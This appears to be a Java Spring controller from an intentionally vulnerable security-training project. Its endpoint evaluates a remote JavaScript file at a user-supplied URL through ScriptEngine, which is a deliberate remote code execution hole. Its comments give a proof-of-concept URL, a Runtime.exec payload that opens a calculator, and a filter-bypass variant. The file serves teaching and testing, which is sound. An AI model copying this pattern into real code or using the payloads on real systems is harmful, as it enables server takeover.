package com.madaha.codesecone.controller.rce;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.util.HtmlUtils;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;

@RestController
@RequestMapping("/RCE/ScriptEngine")
public class LoadJsVul {

    /**
     * @poc http://127.0.0.1:28888/RCE/ScriptEngine/vul?url=http://127.0.0.1:8000/evil_rce.js
     *
     * curl http://127.0.0.1:8000/evil_rce.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * JS Payload绕过：
     * var a = mainOutput(); function mainOutput() { var x=java.lang.\/****\/Runtime.getRuntime().exec("open -a Calculator");}
     *
     * 注意：
     * 在 Java 8 之后，ScriptEngineManger 的 eval 函数没后了。
     *
     * @param url
     * @return
     */
    @RequestMapping("/vul")
    public String jsEngine(String url){
        try{
            // 通过脚本名称获取
            // ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");

            // 通过文件扩展名获取
            ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");

            // Bindings: 用来存放数据的容器
            Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
            // String cmd = String.format("load(\"%s\")", url);
            String payload = String.format("load('%s')", url);

            engine.eval(payload, bindings);

            return "漏洞执行成功";
        }catch (Exception e){
            return "加载远程脚本：" + HtmlUtils.htmlEscape(url);
        }
    }
}
